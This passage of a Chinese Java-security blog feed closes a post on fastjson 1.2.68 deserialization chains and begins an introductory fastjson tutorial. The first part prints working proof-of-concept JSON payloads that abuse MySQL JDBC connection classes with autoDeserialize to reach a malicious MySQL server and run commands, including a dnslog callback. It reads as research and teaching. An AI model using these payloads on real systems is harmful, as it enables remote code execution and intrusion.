\&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;  \&quot;@type\&quot;: &#x27;com.mysql.jdbc.JDBC4Connection&#x27;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;  \&quot;hostToConnectTo\&quot;: \&quot;kx97t6.dnslog.cn\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;  \&quot;portToConnectTo\&quot;: 3306,\n&quot;</span> +<br>                <span class="hljs-string">&quot;  \&quot;info\&quot;: &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;user\&quot;: \&quot;root\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;password\&quot;: \&quot;root\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;NUM_HOSTS\&quot;: \&quot;1\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;  &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;  \&quot;databaseToConnectTo\&quot;: \&quot;lingx5\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;  \&quot;url\&quot;: \&quot;\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250328101945811.png" alt="image-20250328101945811"></p><p>既然可以发送mysql的连接请求，结合Mysql的反序列化的gadget，可以实现命令执行</p><h5 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h5><p>我们在研究JNDI的时候 讨论过mysql的反序列化，可以去看 <a href="https://www.cnblogs.com/LINGX5/p/18780870#%E9%BB%98%E8%AE%A4%E5%B7%A5%E5%8E%82%E5%88%A9%E7%94%A8">这部分内容</a></p><p>我们用工具开启一个恶意的mysql服务器</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250328102658940.png" alt="image-20250328102658940" style="zoom: 50%;" /><p>生成的POC</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">jdbc:</span>mysql://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">3306</span>/test?autoDeserialize=true&amp;statementInterceptors=<span class="hljs-keyword">com</span>.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=deser_CC31_calc<br></code></pre></td></tr></table></figure><p>我们把对应的属性添加进去</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.poc;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JDBCDeser</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;  \&quot;@type\&quot;: \&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;  \&quot;@type\&quot;: &#x27;com.mysql.jdbc.JDBC4Connection&#x27;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;  \&quot;hostToConnectTo\&quot;: \&quot;localhost\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;  \&quot;portToConnectTo\&quot;: 3306,\n&quot;</span> +<br>                <span class="hljs-string">&quot;  \&quot;info\&quot;: &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;user\&quot;: \&quot;deser_CC31_calc\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;password\&quot;: \&quot;root\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;statementInterceptors\&quot;:&#x27;com.mysql.jdbc.interceptors&quot;</span> +<br>                <span class="hljs-string">&quot;.ServerStatusDiffInterceptor&#x27;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;autoDeserialize\&quot;: \&quot;true\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;NUM_HOSTS\&quot;: \&quot;1\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;  &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;  \&quot;databaseToConnectTo\&quot;: \&quot;test\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;  \&quot;url\&quot;: \&quot;\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250328103424127.png" alt="image-20250328103424127"></p><h4 id="LoadBalancedMySQLConnection"><a href="#LoadBalancedMySQLConnection" class="headerlink" title="LoadBalancedMySQLConnection"></a>LoadBalancedMySQLConnection</h4><p>适用版本6.0.2&#x2F;6.0.3</p><p>LoadBalancedMySQLConnection这个类的构造方法只需要一个 url 就可以发送mysql的连接请求</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">LoadBalancedMySQLConnection</span><span class="hljs-params">(LoadBalancedConnectionProxy proxy)</span> &#123;<br>    <span class="hljs-built_in">super</span>(proxy);<br>&#125;<br></code></pre></td></tr></table></figure><p>LoadBalancedConnectionProxy 在初始化的时候，会去调用 pickNewConnection() 方法，最终调用到 com.mysql.cj.mysqla.MysqlaSession#connect 创建mysql连接</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250328122856997.png" alt="image-20250328122856997"></p><p><strong>jdbc6Deser</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.poc;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">jdbc6Deser</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;       \&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;       \&quot;@type\&quot;:\&quot;com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;       \&quot;proxy\&quot;: &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;              \&quot;connectionString\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                     \&quot;url\&quot;:\&quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=deser_CC31_calc\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;              &#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;       &#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>创建连接的调用栈</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250328123337617.png" alt="image-20250328123337617"></p><p>复制出来 看一下</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus">connect:<span class="hljs-number">149</span>, MysqlaSession (com<span class="hljs-selector-class">.mysql</span><span class="hljs-selector-class">.cj</span>.mysqla)<br>connectOneTryOnly:<span class="hljs-number">1803</span>, ConnectionImpl (com<span class="hljs-selector-class">.mysql</span><span class="hljs-selector-class">.cj</span>.jdbc)<br>createNewIO:<span class="hljs-number">1673</span>, ConnectionImpl (com<span class="hljs-selector-class">.mysql</span><span class="hljs-selector-class">.cj</span>.jdbc)<br>&lt;init&gt;:<span class="hljs-number">656</span>, ConnectionImpl (com<span class="hljs-selector-class">.mysql</span><span class="hljs-selector-class">.cj</span>.jdbc)<br>getInstance:<span class="hljs-number">349</span>, ConnectionImpl (com<span class="hljs-selector-class">.mysql</span><span class="hljs-selector-class">.cj</span>.jdbc)<br>createConnectionForHost:<span class="hljs-number">329</span>, MultiHostConnectionProxy (com<span class="hljs-selector-class">.mysql</span><span class="hljs-selector-class">.cj</span><span class="hljs-selector-class">.jdbc</span>.ha)<br>createConnectionForHost:<span class="hljs-number">374</span>, LoadBalancedConnectionProxy (com<span class="hljs-selector-class">.mysql</span><span class="hljs-selector-class">.cj</span><span class="hljs-selector-class">.jdbc</span>.ha)<br>pickConnection:<span class="hljs-number">80</span>, RandomBalanceStrategy (com<span class="hljs-selector-class">.mysql</span><span class="hljs-selector-class">.cj</span><span class="hljs-selector-class">.jdbc</span>.ha)<br>pickNewConnection:<span class="hljs-number">318</span>, LoadBalancedConnectionProxy (com<span class="hljs-selector-class">.mysql</span><span class="hljs-selector-class">.cj</span><span class="hljs-selector-class">.jdbc</span>.ha)<br>&lt;init&gt;:<span class="hljs-number">227</span>, LoadBalancedConnectionProxy (com<span class="hljs-selector-class">.mysql</span><span class="hljs-selector-class">.cj</span><span class="hljs-selector-class">.jdbc</span>.ha)<br></code></pre></td></tr></table></figure><p>成功执行</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250328123434401.png" alt="image-20250328123434401"></p><h4 id="ReplicationMySQLConnection"><a href="#ReplicationMySQLConnection" class="headerlink" title="ReplicationMySQLConnection"></a>ReplicationMySQLConnection</h4><p>适用版本 8.0.19</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs json"> <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>       <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.mysql.cj.jdbc.ha.ReplicationMySQLConnection&quot;</span><span class="hljs-punctuation">,</span><br>       <span class="hljs-attr">&quot;proxy&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>              <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy&quot;</span><span class="hljs-punctuation">,</span><br>              <span class="hljs-attr">&quot;connectionUrl&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>                     <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.mysql.cj.conf.url.ReplicationConnectionUrl&quot;</span><span class="hljs-punctuation">,</span><br>                     <span class="hljs-attr">&quot;masters&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br>                            <span class="hljs-attr">&quot;host&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&quot;</span><br>                     <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                     <span class="hljs-attr">&quot;slaves&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                     <span class="hljs-attr">&quot;properties&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>                            <span class="hljs-attr">&quot;host&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;user&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;deser_CC31_calc&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;dbname&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;dbname&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;pass&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;queryInterceptors&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;autoDeserialize&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;true&quot;</span><br>                     <span class="hljs-punctuation">&#125;</span><br>              <span class="hljs-punctuation">&#125;</span><br>       <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250328125244146.png" alt="image-20250328125244146"></p><blockquote><p>这条链能够反序列化的只有8.0.19这一个小版本，因为LoadBalancedConnectionProxy的构造参数略有改变</p></blockquote><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://y4er.com/posts/fastjson-bypass-autotype-1268/">fastjson 1.2.68 bypass autotype - Y4er 的博客</a></p><p><a href="https://www.anquanke.com/post/id/232774">浅析 Fastjson1.2.62-1.2.68 反序列化漏洞-安全 KER - 安全资讯平台</a></p><p><a href="https://rivers.chaitin.cn/blog/cq70jnqp1rhtmlvvdo2g">Fastjson 1.2.68 反序列化漏洞 Commons IO 2.x 写文件利用链挖掘分析 | 长亭百川云</a></p><p><a href="https://blog.csdn.net/weixin_39555624/article/details/117820779">https://blog.csdn.net/weixin_39555624/article/details/117820779</a> （这篇文章主要是 fastjson 的特性）</p><p><a href="https://blog.ninefiger.top/2022/11/11/fastjson%201.2.68%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">fastjson 1.2.68 漏洞分析</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzUzNDMyNjI3Mg==&mid=2247484866&idx=1&sn=23fb7897f6e54cdf61031a65c602487d">关于 blackhat2021 披露的 fastjson1.2.68 链</a></p>]]></content>
    
    
    <categories>
      
      <category>java安全</category>
      
      <category>fastjson系列</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
      <tag>fastjson反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fastjson反序列化</title>
    <link href="/2025/03/25/fastjson/"/>
    <url>/2025/03/25/fastjson/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1 id="fastjson-反序列化"><a href="#fastjson-反序列化" class="headerlink" title="fastjson 反序列化"></a>fastjson 反序列化</h1><h2 id="简单了解"><a href="#简单了解" class="headerlink" title="简单了解"></a>简单了解</h2><p>fastjson 的 maven 坐标</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.4<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>fastjson 是阿里巴巴的开源 JSON 解析库，可以把 json 字符串解析为 java Bean 对象，同样也可以把 java Bean 对象解析为 json 字符串。</p><h3 id="javaBean-对象"><a href="#javaBean-对象" class="headerlink" title="javaBean 对象"></a>javaBean 对象</h3><p>那么什么是 javaBean 对象呢？</p><p>JavaBean 是一种符合特定规范的 Java 类，通俗点的解释就是：</p><ol><li>属性是私有的，且每个属性都应该具有对应的 setter 和 getter 方法</li><li>JavaBean 必须有一个无参数的公共构造方法。<span style="color:#FF0000;"> 如果你要自定义有参构造方法，那必须显示声明无参构造方法 </span></li></ol><p><strong>一个 javaBean 的示例</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.entry;<br><br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;<br><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-comment">// 无参构造方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-comment">// 带参数的构造方法（可选）</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-comment">// Getter方法</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-comment">// Setter方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-comment">// Getter方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-comment">// Setter方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="toJSONString"><a href="#toJSONString" class="headerlink" title="toJSONString()"></a>toJSONString()</h3><p>com.alibaba.fastjson.JSON#toJSONString(java.lang.Object)方法就是把 javaBean 转换为 json 字符串，这个过程它会去调用 javaBean 对象的所有 getter()方法，来获取属性的值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.lingx5.entry.Person;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">jsonTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;lingx5&quot;</span>, <span class="hljs-number">18</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span> JSON.toJSONString(person);<br>        System.out.println(json);           <span class="hljs-comment">// &#123;&quot;age&quot;:18,&quot;name&quot;:&quot;lingx5&quot;&#125;</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>结果肯定是显而易见的</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250320163435555.png" alt="image-20250320163435555" style="zoom:50%;" /><p>当然，我们在 javaBean 对应个 getter()方法中加入输出，再来看看结果</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250320163936056.png" alt="image-20250320163936056" style="zoom:50%;" /><p>我们再次运行 jsonTest</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250320164042090.png" alt="image-20250320164042090" style="zoom:50%;" /><p>在默认情况下，Fastjson 将 JavaBean 对象序列化为 JSON 字符串时，<strong>主要依赖于反射机制</strong>，并通过 <strong>内省 (Introspection)</strong> 机制 <strong>查找并调用 JavaBean 对象的 getter 方法</strong> 来获取属性值。</p><h3 id="parse"><a href="#parse" class="headerlink" title="parse()"></a>parse()</h3><p>com.alibaba.fastjson.JSON#parse(java.lang.String)这个方法可以把 JSON 字符串转换为 java 对象，不过 <span style="color:#FF0000;"> 默认情况下会转换为 com.alibaba.fastjson.JSONObject 对象，不会是我们的 javaBean 对象 </span></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">jsonTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">personJson</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;name\&quot;:\&quot;lingx5\&quot;,\&quot;age\&quot;:18&#125;&quot;</span>;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">parse</span> <span class="hljs-operator">=</span> JSON.parse(personJson);<br>        System.out.println(parse);<br>        System.out.println(<span class="hljs-string">&quot;parse的类型是：&quot;</span>+parse.getClass().getTypeName());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><img src="https://gitee.com/ling-x5/img/raw/master/image-20250320170302517.png" alt="image-20250320170302517" style="zoom:50%;" /><p>我们没有转换为 javaBean 对象，那自然也不会调用 javaBean 的 getter()和 setter()方法</p><p>那怎么转化为 javaBean 对象呢？</p><h3 id="type"><a href="#type" class="headerlink" title="@type"></a>@type</h3><p>在 fastjson1.2.4 中，默认是开启 autoType 属性的。即在 parse()方法执行时，识别到字段 <code>@type</code> 会根据字段的值，利用 javaBean 的无参构造器和 setter()去封装对应的 javaBean 对象。也正是因为这一特性，为 fastjson 反序列化漏洞打开了大门。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">jsonTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">personJson</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.lingx5.entry.Person\&quot;,\&quot;name\&quot;:\&quot;lingx5\&quot;,\&quot;age\&quot;:18&#125;&quot;</span>;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">parse</span> <span class="hljs-operator">=</span> JSON.parse(personJson);<br>        System.out.println(parse);<br>        System.out.println(<span class="hljs-string">&quot;parse的类型是：&quot;</span>+parse.getClass().getTypeName());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><img src="https://gitee.com/ling-x5/img/raw/master/image-20250320175156909.png" alt="image-20250320175156909" style="zoom:50%;" /><p>我们看到在处理@type 字段时，parse()方法会去调用我们指定的类的 setter()方法，封装一个 javaBean 对象出来</p><h3 id="parseObject"><a href="#parseObject" class="headerlink" title="parseObject()"></a>parseObject()</h3><p>其实除了@type 字段可以让 json 字符串转化为我们想要的 javaBean 对象，还可以使用 com.alibaba.fastjson.JSON#parseObject(java.lang.String, java.lang.Class <T>)在第二个参数指定 class，从而实现转换</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">jsonTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">personJson</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;name\&quot;:\&quot;lingx5\&quot;,\&quot;age\&quot;:18&#125;&quot;</span>;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">parse</span> <span class="hljs-operator">=</span> JSON.parseObject(personJson, com.lingx5.entry.Person.class);<br>        System.out.println(parse);<br>        System.out.println(<span class="hljs-string">&quot;parse的类型是：&quot;</span>+parse.getClass().getTypeName());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><img 